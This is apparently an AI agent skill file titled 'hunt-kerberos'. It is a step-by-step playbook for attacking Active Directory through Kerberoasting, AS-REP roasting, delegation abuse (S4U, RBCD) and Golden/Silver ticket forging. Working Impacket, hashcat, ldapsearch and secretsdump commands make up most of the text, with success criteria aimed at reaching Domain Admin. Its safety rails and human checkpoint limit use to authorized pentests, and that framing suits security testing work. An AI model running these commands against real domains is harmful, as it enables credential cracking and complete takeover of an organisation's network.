---
name: hunt-kerberos
description: >
  Kerberos attack techniques: Kerberoasting,
  AS-REP Roasting, Golden/Silver Ticket,
  delegation abuse, S4U attacks. Refined 0
  times. Last success: N/A.
allowed_tools:
  - Bash(ldapsearch:*, GetUserSPNs*:*, GetNPUsers*:*,
    getST*:*, ticketer*:*, hashcat:*, secretsdump*:*,
    Rubeus*:*, klist:*, kinit:*, certipy:*)
  - Read
  - Grep
  - Glob
  - WebSearch
when_to_use: >
  AD environment with valid credentials.
  Triggers: "kerberoast", "AS-REP",
  "golden ticket", "silver ticket",
  "kerberos attack", "SPN abuse",
  "delegation attack", "S4U"
argument-hint: "[domain/user:pass@DC_IP]"
---

# Hunt: Kerberos Attacks

## Success Rate
- Times used: 0
- Vulns found: 0
- Last refined: N/A
- Avg severity: Critical
- Avg bounty: $5,000 - $25,000

## Goal
Find and exploit Kerberos misconfigurations
for privilege escalation to Domain Admin.

## Technique

### Step 1: Enumerate SPN Accounts
```bash
# Impacket — find Kerberoastable accounts
GetUserSPNs.py DOMAIN/user:password \
  -dc-ip DC_IP -outputfile spns.txt

# Or via LDAP
ldapsearch -x -H ldap://DC_IP \
  -b "DC=domain,DC=local" \
  -D "user@domain.local" -W \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName \
  adminCount memberOf
```

**Success criteria**: List of all SPN accounts
with their group memberships. Prioritize
accounts with `adminCount=1`.

**Artifacts**: spns.txt, list of high-value
SPN accounts.

### Step 2: Kerberoasting
```bash
# Request TGS for all SPN accounts
GetUserSPNs.py DOMAIN/user:password \
  -dc-ip DC_IP -request \
  -outputfile kerberoast_hashes.txt

# Crack with hashcat (mode 13100 = TGS-REP)
hashcat -m 13100 kerberoast_hashes.txt \
  wordlist.txt -r rules/best64.rule \
  --force
```

**Success criteria**: At least one SPN account
password cracked. Priority if adminCount=1.

**Artifacts**: Cracked credentials.

### Step 3: AS-REP Roasting
```bash
# Find accounts without pre-authentication
GetNPUsers.py DOMAIN/ -usersfile users.txt \
  -dc-ip DC_IP -format hashcat \
  -outputfile asrep_hashes.txt

# Or enumerate via LDAP
ldapsearch -x -H ldap://DC_IP \
  -b "DC=domain,DC=local" \
  -D "user@domain.local" -W \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# Crack (mode 18200 = AS-REP)
hashcat -m 18200 asrep_hashes.txt \
  wordlist.txt -r rules/best64.rule
```

**Success criteria**: AS-REP hash obtained
and cracked for at least one account.

### Step 4: Delegation Abuse

**Unconstrained Delegation**:
```bash
# Find unconstrained delegation machines
ldapsearch -x -H ldap://DC_IP \
  -b "DC=domain,DC=local" \
  -D "user@domain.local" -W \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  sAMAccountName dNSHostName

# If you have admin on an unconstrained machine:
# 1. Coerce DC to authenticate to it
# 2. Capture DC TGT
# 3. Use for DCSync
```

**Constrained Delegation (S4U)**:
```bash
# Find constrained delegation
ldapsearch -x -H ldap://DC_IP \
  -b "DC=domain,DC=local" \
  -D "user@domain.local" -W \
  "(msDS-AllowedToDelegateTo=*)" \
  sAMAccountName msDS-AllowedToDelegateTo

# Abuse with S4U2Self + S4U2Proxy
getST.py -spn TARGET_SPN \
  -impersonate Administrator \
  DOMAIN/service_account:password \
  -dc-ip DC_IP
export KRB5CCNAME=Administrator.ccache
```

**RBCD**:
```bash
# Find writable computer objects
# (GenericAll, GenericWrite, WriteProperty)
# Then set msDS-AllowedToActOnBehalf

addcomputer.py DOMAIN/user:password \
  -computer-name FAKE01$ \
  -computer-pass FakePass123

rbcd.py DOMAIN/user:password \
  -delegate-to TARGET$ \
  -delegate-from FAKE01$ \
  -dc-ip DC_IP -action write

getST.py -spn CIFS/target.domain.local \
  -impersonate Administrator \
  DOMAIN/FAKE01$:FakePass123 \
  -dc-ip DC_IP
```

**Success criteria**: Obtained TGS/TGT
for a privileged account via delegation.

### Step 5: Golden / Silver Ticket

**Golden Ticket** (requires krbtgt hash):
```bash
# After DCSync, extract krbtgt
secretsdump.py DOMAIN/admin:password@DC_IP \
  -just-dc-user krbtgt

# Forge Golden Ticket
ticketer.py -nthash KRBTGT_NTLM \
  -domain-sid S-1-5-21-XXXX \
  -domain domain.local \
  -duration 3650 \
  Administrator

export KRB5CCNAME=Administrator.ccache
# Now you have unlimited access
```

**Silver Ticket** (requires service hash):
```bash
ticketer.py -nthash SERVICE_NTLM \
  -domain-sid S-1-5-21-XXXX \
  -domain domain.local \
  -spn CIFS/target.domain.local \
  Administrator
```

**Success criteria**: Forged ticket grants
access to target resources.

**[human] checkpoint**: Confirm authorization
before forging tickets.

## Patterns That Work

| Pattern | Context | Confidence |
|---------|---------|------------|
| SPN on DA account | AD with old service accounts | 9 |
| No preauth on user | Legacy / misconfigured accounts | 8 |
| Unconstrained deleg on server | Older domain setups | 9 |
| Constrained deleg to CIFS/LDAP | Misconfigured delegation | 8 |
| GenericAll on computer | ACL misconfig | 9 |

## False Positive Filters
- gMSA accounts: password auto-rotates, can't
  crack (128 char random) → skip Kerberoasting
- Machine accounts ($): usually random 120 char
  passwords → skip cracking
- AES-only Kerberos: if RC4 disabled, may not
  get crackable hashes → check encryption types
- Honeypot SPNs: some orgs set trap SPN accounts
  with alerts → be aware

## Safety Rails
- Authorized internal pentest only
- Don't crack credentials outside of scope
- Golden/Silver tickets require explicit auth
- Clean up any created computer accounts
- Don't use credentials for out-of-scope access

## Changelog
- Initial creation: Kerberoasting, AS-REP,
  delegation, Golden/Silver Ticket techniques
